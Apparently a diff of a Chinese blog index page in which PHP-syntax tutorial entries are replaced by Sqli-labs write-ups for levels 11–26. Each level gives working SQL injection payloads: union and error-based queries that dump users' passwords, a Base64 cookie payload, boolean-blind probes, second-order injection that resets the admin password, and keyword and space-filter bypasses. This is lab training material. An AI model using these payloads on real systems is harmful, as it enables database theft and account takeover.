+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-9.png" alt="3-9"></p>
+<h4 id="3-10-打开日志功能同时设置日志的目录，启用详细的日志记录格式"><a href="#3-10-打开日志功能同时设置日志的目录，启用详细的日志记录格式" class="headerlink" title="3.10 打开日志功能同时设置日志的目录，启用详细的日志记录格式"></a>3.10 打开日志功能同时设置日志的目录，启用详细的日志记录格式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xferlog_enable=YES</span><br><span class="line">xferlog_file=/var/log/vsftpd.log</span><br><span class="line">xferlog_enable=YES</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-10.png" alt="3-10"></p>
+<h4 id="3-11-如果打开虚用户功能等，那么建议关闭本地用户登录"><a href="#3-11-如果打开虚用户功能等，那么建议关闭本地用户登录" class="headerlink" title="3.11 如果打开虚用户功能等，那么建议关闭本地用户登录"></a>3.11 如果打开虚用户功能等，那么建议关闭本地用户登录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local_enable=NO</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/MySQL5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%A1%E7%90%86/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/3-11.png" alt="3-11"></p>
+<hr>
+<h2 id="【思考】"><a href="#【思考】" class="headerlink" title="【思考】"></a>【思考】</h2><p><strong>缺省安装额mysql有密码吗？</strong></p>
+<p>答：没有</p>
 
       
 
@@ -170,7 +264,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Mysql数据库</a>
         		</li>
       		
 		</ul>
@@ -180,7 +274,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/25/PHP语法（十四）—注释/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/01/MySQL5数据库配置与管理（一）—数据库安全学习笔记/">展开全文 >></a>
         </p>
       
 
@@ -210,38 +304,85 @@
 
 
   
-    <article id="post-PHP语法（十三）—输出方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Sqli-labs 第21-30关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/24/PHP语法（十三）—输出方法/">PHP语法（十三） — 输出方法</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/01/31/Sqli-labs 第21-30关/">Sqli-labs(第21-30关)</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/24/PHP语法（十三）—输出方法/" class="archive-article-date">
-  	<time datetime="2019-02-23T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-24</time>
+        <a href="/Knlvre.github-io/2019/01/31/Sqli-labs 第21-30关/" class="archive-article-date">
+  	<time datetime="2019-01-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）echo / print 两种输出方法</p>
-<p>（2）echo / print “输出内容”</p>
-<p>​    echo / print (“输出内容”)；</p>
-<p>​    有无括号均可；</p>
+        <h3 id="前一部分链接：第11-20关Write-up"><a href="#前一部分链接：第11-20关Write-up" class="headerlink" title="前一部分链接：第11-20关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3><hr>
+<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>与<code>Less-20</code>类似，只是对变量<code>Cookiee</code>进行了<code>Base64</code>加密，并且使用单引号和括号进行包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-1.png" alt="1-1"></p>
+<p>将<code>payload</code>进行加密</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-2.png" alt="1-2"></p>
+<p>加入到 <code>Cookie</code>中，注入成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/1-3.png" alt="1-3"></p>
 <hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、echo输出-—-能够输出一个以上的字符串"><a href="#一、echo输出-—-能够输出一个以上的字符串" class="headerlink" title="一、echo输出 — 能够输出一个以上的字符串"></a>一、echo输出 — 能够输出一个以上的字符串</h3><h4 id="输入代码"><a href="#输入代码" class="headerlink" title="输入代码"></a>输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;h1&gt;PHP输出方式&lt;/h1&gt;&quot;;</span><br><span class="line">echo &quot;echo&lt;/br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo &quot;可以&quot;,&quot;加入html标签&quot;,&quot;也可以像这样&quot;,&quot;多个字符串&quot;,&quot;隔开&quot;,&quot;同时&quot;,&quot;输出&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%BE%93%E5%87%BA%E6%96%B9%E6%B3%95/1-1.png" alt="1-1"></p>
-<h4 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%BE%93%E5%87%BA%E6%96%B9%E6%B3%95/1-2.png" alt="1-2"></p>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>与前面关卡类似，只是对<code>$cookee</code>包括采用了<code>双引号</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-1.png" alt="2-1"></p>
+<p><code>Base64</code>加密一下<code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#</span><br><span class="line"></span><br><span class="line">加密后：</span><br><span class="line">IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt="2-2"></p>
 <hr>
-<h4 id="二、print输出-—-只能输出一个字符串"><a href="#二、print输出-—-只能输出一个字符串" class="headerlink" title="二、print输出 — 只能输出一个字符串"></a>二、print输出 — 只能输出一个字符串</h4><h4 id="输入代码-1"><a href="#输入代码-1" class="headerlink" title="输入代码"></a>输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print &quot;&lt;h1&gt;PHP输出方式&lt;/h1&gt;&quot;;</span><br><span class="line"></span><br><span class="line">print (&quot;print&lt;/br&gt;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%BE%93%E5%87%BA%E6%96%B9%E6%B3%95/2-1.png" alt="2-1"></p>
-<h4 id="查看结果-1"><a href="#查看结果-1" class="headerlink" title="查看结果"></a>查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/%E8%BE%93%E5%87%BA%E6%96%B9%E6%B3%95/2-2.png" alt="2-2"></p>
+<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源代码，本关将注释符：<code>#、--</code>进行了过滤，查询语句是通过<code>单引号</code>来包裹<code>$id</code>的</p>
+<p>所以只需要将结尾的单引号处理掉就好了</p>
+<p>爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
+<p>其他的语句自行构造，不再赘述</p>
+<hr>
+<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>本关考察<code>二次排序注入（二次注入、存储型注入）</code></p>
+<p>查看本关源代码</p>
+<p><code>创建用户</code>时的语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)</span><br></pre></td></tr></table></figure>
+<p><code>修改密码</code>时的语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<p>结题思路：</p>
+<p>创建一个用户，名为<code>admin&#39;#</code>，密码随意，数据库执行以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;admin&apos;#\&quot;, \&quot;666\&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-1.png" alt="4-1"></p>
+<p>返回首页，<code>登陆</code>这个新注册的<code>admin&#39;#</code>用户</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-2.png" alt="4-2"></p>
+<p>登陆成功，可以直接<code>修改密码</code>，数据库执行了以下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;# and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-3.png" alt="4-3"></p>
+<p>此时<code>admin</code>用户的密码已经改成我们修改的那个密码了，可以直接登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-4.png" alt="4-4"></p>
+<hr>
+<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p><code>单引号包裹</code>、题目提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
+<p>但是影响并不是很大，因为可以用<code>双写</code>绕过</p>
+<p><code>information</code>里面包含<code>or</code>，记得双写绕过就可以了：<code>infoorrmation</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-1.png" alt="5-1"></p>
+<p>其他的不再赘述</p>
+<hr>
+<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p><code>没有用符号包裹</code>、同样提示我们<code>or</code>和<code>and</code>被过滤掉了</p>
+<p>其他和Less-25一样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-2.png" alt="5-2"></p>
+<hr>
+<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>看一下源码，过滤了：<code>or、and、/、*、--、#、\s空格、/、\\</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>（1）<code>or</code>和<code>and</code>的绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or：用||代替</span><br><span class="line">and:用&amp;&amp;代替</span><br></pre></td></tr></table></figure>
+<p>（2）<code>空格</code>的绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09：tab键（水平）</span><br><span class="line">%0b：tab键（垂直）</span><br><span class="line">%0a：新建一行</span><br><span class="line">%0c：新的一页</span><br><span class="line">%0d：return功能</span><br><span class="line">%a0：空格</span><br></pre></td></tr></table></figure>
+<p>由于我的环境问题，无法解析<code>%09、%0b、%0a</code>等，只能意淫一下payload：</p>
+<p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;%0bunion%0bselect%0b1,2,3%0b||&apos;1</span><br></pre></td></tr></table></figure>
+<hr>
 
       
 
@@ -255,7 +396,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">PHP语法</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Sqli-labs</a>
         		</li>
       		
 		</ul>
@@ -265,7 +406,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/24/PHP语法（十三）—输出方法/">展开全文 >></a>
+          <a class="article-more-a" href="/Knlvre.github-io/2019/01/31/Sqli-labs 第21-30关/">展开全文 >></a>
         </p>
       
 
@@ -295,46 +436,182 @@
 
 
   
-    <article id="post-PHP语法（十二）—for循环" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Sqli-labs 第11-20关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/23/PHP语法（十二）—for循环/">PHP语法（十二） — for循环</a>
+      <a class="article-title" href="/Knlvre.github-io/2019/01/30/Sqli-labs 第11-20关/">Sqli-labs(第11-20关)</a>
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/23/PHP语法（十二）—for循环/" class="archive-article-date">
-  	<time datetime="2019-02-22T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-23</time>
+        <a href="/Knlvre.github-io/2019/01/30/Sqli-labs 第11-20关/" class="archive-article-date">
+  	<time datetime="2019-01-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-30</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><h3 id="（1）For循环"><a href="#（1）For循环" class="headerlink" title="（1）For循环"></a>（1）For循环</h3><p>for(init counter;test counter;increment counter){</p>
-<p>​    code to executed;</p>
-<p>}</p>
-<p>参数</p>
-<p>init counter：初始化循环计数器的值</p>
-<p>test counter：评估每个循环。如果值为TRUE，继续循环。如果它的值为FALSE，循环结束</p>
-<p>invrement counter：增加循环计数器的值</p>
-<h3 id="（2）Foreach"><a href="#（2）Foreach" class="headerlink" title="（2）Foreach"></a>（2）Foreach</h3><p><strong>Foreach</strong>遍历数组中每个元素并循环代码块，每进行一次循环，当前数组元素的值就会被赋值给<strong>$value</strong>变量，并且数组指针会逐一地移动，直到到达最后一个数组</p>
-<p>foreach($array as $value){</p>
-<p>​    code to executed;</p>
-<p>}</p>
+        <h3 id="前一部分链接：第1-10关Write-up"><a href="#前一部分链接：第1-10关Write-up" class="headerlink" title="前一部分链接：第1-10关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/29/Sqli-labs%20%E7%AC%AC1-10%E5%85%B3/">第1-10关Write-up</a></h3><hr>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前其他资料学习过程中，学会一个挺好用的学习技巧</p>
+<p>在源码中<code>$sql</code>变量下方加入以下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-0-1.png" alt="1-0-1"></p>
+<p>网页可以看<code>$sql</code>的内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-0-2.png" alt="1-0-2"></p>
 <hr>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、For循环"><a href="#一、For循环" class="headerlink" title="一、For循环"></a>一、For循环</h3><h4 id="输入代码"><a href="#输入代码" class="headerlink" title="输入代码"></a>输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i=0;$i&lt;10;$i++)&#123;</span><br><span class="line">    echo &quot;i的值为：&quot;.$i.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/for%E5%BE%AA%E7%8E%AF/1-1.png" alt="1-1"></p>
-<h4 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/for%E5%BE%AA%E7%8E%AF/1-2.png" alt="1-2"></p>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less - 11"></a>Less - 11</h2><p>从源代码来看，提交的用户名为<code>uname</code>密码为<code>passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-1.png" alt="1-1"></p>
+<p>用户名和密码都提交<code>1</code>，说登录失败</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-2.png" alt="1-2"></p>
+<p>常规手段，在密码后面加一个<code>单引号</code>，报错</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-3.png" alt="1-3"></p>
+<p>报错信息可以看出，对<code>id</code>参数用<code>单引号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-4.png" alt="1-4"></p>
+<p>那么此题从<code>用户名</code>注入和从<code>密码</code>注入都是可以的</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-5.png" alt="1-5"></p>
+<p><code>order by</code>测出字段数为2，直接<code>union</code>注入，得到database()</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-6.png" alt="1-6"></p>
+<p>常规手段，爆出数<code>据库名</code>、<code>表名</code>、<code>字段值</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/1-7.png" alt="1-7"></p>
 <hr>
-<h3 id="二、foreach循环"><a href="#二、foreach循环" class="headerlink" title="二、foreach循环"></a>二、foreach循环</h3><h4 id="输入代码-1"><a href="#输入代码-1" class="headerlink" title="输入代码"></a>输入代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$colors = array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;,&quot;yellow&quot;);</span><br><span class="line">foreach($colors as $value)&#123;</span><br><span class="line">    echo $value.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/for%E5%BE%AA%E7%8E%AF/2-1.png" alt="2-1"></p>
-<h4 id="查看结果-1"><a href="#查看结果-1" class="headerlink" title="查看结果"></a>查看结果</h4><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/PHP%E8%AF%AD%E6%B3%95/for%E5%BE%AA%E7%8E%AF/2-2.png" alt="2-2"></p>
-
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less - 12"></a>Less - 12</h2><p>这关<code>HackBar</code>好像出错了，无法POST双引号，直接用网页自带的输入框</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;</code>，没有报错</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;&#39;</code>，没有报错</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&quot;</code>，报错信息才出来，使用<code>双引号</code>加<code>括号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/2-1.png" alt="2-1"></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&quot;) union select username,password from users where id=2 #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/2-2.png" alt="2-2"></p>
+<hr>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;</code>，报错，使用<code>单引号</code>加<code>括号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/3-1.png" alt="3-1"></p>
+<p>但是这关却是<code>布尔注入</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&apos;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;&apos;e&apos; #</span><br></pre></td></tr></table></figure>
+<p>不再赘述</p>
+<hr>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&quot;</code>，报错，使用<code>双引号</code>包裹</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/4-1.png" alt="4-1"></p>
+<p>同样是<code>布尔注入</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&quot; or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&quot;email&quot; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/4-2.png" alt="4-2"></p>
+<hr>
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>本关无论怎么提交都没有报错信息</p>
+<p>那就直接加上<code>or 1=1 #</code>来测试了</p>
+<p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&#39;</code>，加上<code>or 1=1 #</code>，页面回显正常，那我们就知道是通过<code>单引号</code>包裹的了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/5-1.png" alt="5-1"></p>
+<p>源码中的确可以看出来是单引号</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/5-2.png" alt="5-2"></p>
+<p>同样是<code>布尔注入</code></p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&apos; or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&apos;email&apos; #</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/11-20/5-3.png" alt="5-3"></p>
+<hr>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p><code>uname</code>提交<code>aa</code>，<code>passwd</code>提交<code>bb&quot;)</code>，加上<code>or 1=1 #</code>，页面回显正常，那我们就知道是通过<code>双引号加括号</code>包裹的了</p>
+<p>和15关一样，只是将<code>单引号</code>改成<code>双引号加括号</code>就可以了</p>
+<p><code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aa&amp;&amp;passwd=bb&quot;) or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)=&apos;email&apos; #</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这题比较特殊，就从源代码开始看起吧</p>
